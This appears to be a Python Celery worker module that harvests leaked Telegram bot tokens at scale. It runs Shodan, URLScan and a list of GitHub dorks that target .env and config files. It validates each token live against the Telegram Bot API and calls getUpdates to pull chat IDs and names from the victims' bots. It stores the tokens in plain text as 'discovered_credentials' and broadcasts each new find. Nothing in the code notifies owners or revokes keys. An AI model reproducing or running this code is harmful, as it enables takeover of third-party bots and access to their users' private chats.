from app.workers.celery_app import app
import asyncio # Ensure asyncio is imported
# from app.services.broadcaster_srv import broadcaster_service # REMOVED Global instance
from app.services.scanners import ShodanService, GithubService, UrlScanService
from app.core.security import security
from app.core.database import db
import hashlib

# Instantiate services (Fofa/Censys/HybridAnalysis REMOVED - API issues)
shodan = ShodanService()
github = GithubService()
urlscan = UrlScanService()

def _calculate_hash(token: str) -> str:
    return hashlib.sha256(token.encode()).hexdigest()

async def _save_credentials_async(results, source_name: str):
    """
    Validates token format and checks if bot is active via Telegram Bot API.
    Saves if token passes format check AND getMe - does NOT require chats.
    """
    import requests
    from app.services.scanners import _is_valid_token
    
    saved_count = 0
    for item in results:
        token = item.get("token")
        if not token or token == "MANUAL_REVIEW_REQUIRED":
            continue
        
        # Step 1: Validate token format (reject Fernet/hashes)
        if not _is_valid_token(token):
            print(f"    [Validate] ❌ Invalid token format: {token[:20]}...")
            continue
        
        token_hash = _calculate_hash(token)
        existing_id = None
        existing_has_chat = False
        
        # Check if the result already has a chat_id (From URL/DeepScan extraction)
        extracted_chat_id = item.get("chat_id")
        
        try:
            # Step 2: Check if already exists
            existing = db.table("discovered_credentials").select("id, chat_id").eq("token_hash", token_hash).execute()
            if existing.data:
                existing_id = existing.data[0]['id']
                existing_has_chat = existing.data[0].get('chat_id') is not None
                if existing_has_chat:
                    continue  # Skip - already has chat_id
                print(f"    [Validate] Token exists but no chat_id, checking for updates...")
            
            # Step 3: Validate token with Telegram getMe API (NO CHAT REQUIRED)
            print(f"    [Validate] Testing token {token[:15]}... via Bot API")
            
            base_url = f"https://api.telegram.org/bot{token}"
            me_res = requests.get(f"{base_url}/getMe", timeout=10)
            
            if me_res.status_code != 200 or not me_res.json().get('ok'):
                print(f"    [Validate] ❌ Token invalid or revoked")
                continue
            
            bot_info = me_res.json().get('result', {})
            bot_username = bot_info.get('username', 'unknown')
            print(f"    [Validate] ✅ Token valid! Bot: @{bot_username}")
            
            # Step 4: Try to get a chat_id (Priority: Extracted -> API -> None)
            chat_id = extracted_chat_id
            chat_name = None
            chat_type = None

            if chat_id:
                print(f"    [Validate] ✅ Using extracted chat_id: {chat_id}")
            else:
                # Try to fetch via API if we didn't extract one
                try:
                    updates_res = requests.get(f"{base_url}/getUpdates", params={'limit': 10}, timeout=10)
                    if updates_res.status_code == 200 and updates_res.json().get('ok'):
                        updates = updates_res.json().get('result', [])
                        for update in updates:
                            for key in ['message', 'channel_post', 'my_chat_member']:
                                if key in update and update[key].get('chat'):
                                    chat = update[key]['chat']
                                    chat_id = chat.get('id')
                                    chat_name = chat.get('title') or chat.get('username') or chat.get('first_name')
                                    chat_type = chat.get('type')
                                    break
                            if chat_id:
                                break
                except:
                    pass
            
            # Step 5: Save to DB (INSERT new or UPDATE existing if we have chat_id)
            
            if existing_id and chat_id:
                # UPDATE existing record with new chat_id
                update_data = {
                    "chat_id": chat_id,
                    "status": "active",
                    "meta": {
                        **item.get("meta", {}),
                        "bot_username": bot_username,
                        "bot_id": bot_info.get('id'),
                        "chat_name": chat_name,
                        "chat_type": chat_type,
                        "extracted_chat_id": extracted_chat_id # Log that we found it via scan
                    }
                }
                db.table("discovered_credentials").update(update_data).eq("id", existing_id).execute()
                print(f"    [Validate] 🔄 UPDATED Credential ID: {existing_id} with chat_id!")
                
                # Local instantiation for logging
                from app.services.broadcaster_srv import BroadcasterService
                broadcaster = BroadcasterService()
                await broadcaster.send_log(
                    f"🔄 [{source_name}] **Updated Token!**\n"
                    f"Bot: @{bot_username}\n"
                    f"ID: `{existing_id}`\n"
                    f"Chat: {chat_name or chat_id} ({chat_type or 'extracted'})"
                )
                saved_count += 1
            elif existing_id and not chat_id:
                # Token exists, still no chat - skip
                print(f"    [Validate] ⏭️ Token exists, still no chat_id found, skipping.")
            else:
                # INSERT new record
                data = {
                    "bot_token": token,  # Store in plain text
                    "token_hash": token_hash,
                    "chat_id": chat_id,
                    "source": source_name,
                    "status": "pending" if not chat_id else "active",
                    "meta": {
                        **item.get("meta", {}),
                        "bot_username": bot_username,
                        "bot_id": bot_info.get('id'),
                        "chat_name": chat_name,
                        "chat_type": chat_type
                    }
                }
                
                res = db.table("discovered_credentials").insert(data).execute()
                
                if res.data:
                    new_id = res.data[0]['id']
                    status_label = "✅ ACTIVE" if chat_id else "⏳ PENDING"
                    
                    # Local instantiation for logging
                    from app.services.broadcaster_srv import BroadcasterService
                    broadcaster = BroadcasterService()
                    await broadcaster.send_log(
                        f"🎯 [{source_name}] **New Bot Token!**\n"
                        f"Bot: @{bot_username}\n"
                        f"ID: `{new_id}`\n"
                        f"Status: {status_label}"
                    )
                    saved_count += 1
                
        except Exception as e:
            print(f"    [Validate] Error: {e}")
            pass
    return saved_count

def _save_credentials(results, source_name: str):
    """Sync wrapper for async save logic"""
    loop = asyncio.get_event_loop()
    if loop.is_closed():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    return loop.run_until_complete(_save_credentials_async(results, source_name))

def _send_log_sync(message: str):
    """Sync wrapper to send logs via broadcaster."""
    loop = asyncio.get_event_loop()
    if loop.is_closed():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    
    # Local instantiation for logging
    from app.services.broadcaster_srv import BroadcasterService
    broadcaster = BroadcasterService()
    loop.run_until_complete(broadcaster.send_log(message))

@app.task(name="scanner.scan_shodan")
def scan_shodan(query: str = None):
    import time
    default_queries = [
        "http.html:\"api.telegram.org\"",
        "http.html:\"bot_token\"", 
        "http.title:\"Telegram Bot\" OR http.title:\"Telegram Login\""
    ]
    
    queries = [query] if query else default_queries
    total_saved = 0
    errors = []

    print(f"Starting Shodan scan with {len(queries)} queries...")
    _send_log_sync(f"🌎 [Shodan] Starting scan with {len(queries)} queries...")

    for q in queries:
        try:
            results = shodan.search(q)
            saved = _save_credentials(results, "shodan")
            total_saved += saved
            time.sleep(1) # Rate limit respect
        except Exception as e:
            errors.append(str(e))
            
    result_msg = f"Shodan scan finished. Saved {total_saved} new credentials."
    if errors:
        result_msg += f" (Errors: {len(errors)})"
        _send_log_sync(f"❌ [Shodan] Completed with errors: {errors[0]}...")

    _send_log_sync(f"🏁 [Shodan] Finished. Saved {total_saved} new credentials.")
    return result_msg

@app.task(name="scanner.scan_urlscan")
def scan_urlscan(query: str = "api.telegram.org"):
    print(f"Starting URLScan scan: {query}")
    _send_log_sync(f"🔍 [URLScan] Starting scan with query: `{query}`")
    try:
        results = urlscan.search(query)
        saved = _save_credentials(results, "urlscan")
        msg = f"URLScan scan finished. Saved {saved} new credentials."
        _send_log_sync(f"🏁 [URLScan] Finished. Saved {saved} new credentials.")
        return msg
    except Exception as e:
        _send_log_sync(f"❌ [URLScan] Scan failed: {e}")
        return f"URLScan scan failed: {e}"

@app.task(name="scanner.scan_github")
def scan_github(query: str = None):
    import time
    default_dorks = [
        # Configuration Files
        "filename:.env \"TELEGRAM_BOT_TOKEN\"",
        "filename:.env \"TG_BOT_TOKEN\"", 
        "filename:.env \"api.telegram.org\"",
        "filename:config.json \"bot_token\"",
        "filename:settings.py \"TELEGRAM_TOKEN\"",
        "filename:config.yaml \"telegram_token\"",
        "filename:config.toml \"telegram_token\"",
        "filename:docker-compose.yml \"TELEGRAM_BOT_TOKEN\"",
        
        # Code Patterns
        "language:python \"ApplicationBuilder\" \"token\"",
        "language:javascript \"new TelegramBot\" \"token\"",
        "language:php \"TelegramBot\" \"api_key\"",
        "language:go \"NewBotAPI\"",
        
        # Strings
        "\"https://api.telegram.org/bot\" -filename:README.md -filename:dataset", # Exclude common non-key files
        "\"123456789:\" NOT 123456789", # Try to find tokens that start with digits but aren't example ones
        
        # Specific Variable Names
        "\"TELEGRAM_KEY\"",
        "\"BOT_TOKEN\""
    ]
    
    queries = [query] if query else default_dorks
    total_saved = 0
    errors = []

    print(f"Starting GitHub scan with {len(queries)} queries...")
    _send_log_sync(f"🐱 [GitHub] Starting scan with {len(queries)} dorks...")

    for q in queries:
        print(f"Executing GitHub Dork: {q}")
        try:
            results = github.search(q)
            saved = _save_credentials(results, "github")
            total_saved += saved
            print(f"  > Found {len(results)} matches, saved {saved} new.")
        except Exception as e:
            print(f"  > Error: {e}")
            errors.append(str(e))
        
            time.sleep(5) 

    result_msg = f"GitHub scan finished. Saved {total_saved} unique credentials."
    if errors:
        result_msg += f" (Encountered {len(errors)} errors)"
    _send_log_sync(f"🏁 [GitHub] Finished. Saved {total_saved} unique credentials.")
    return result_msg

# scan_censys REMOVED - Censys API access issues
# scan_hybrid REMOVED - Hybrid Analysis API access issues
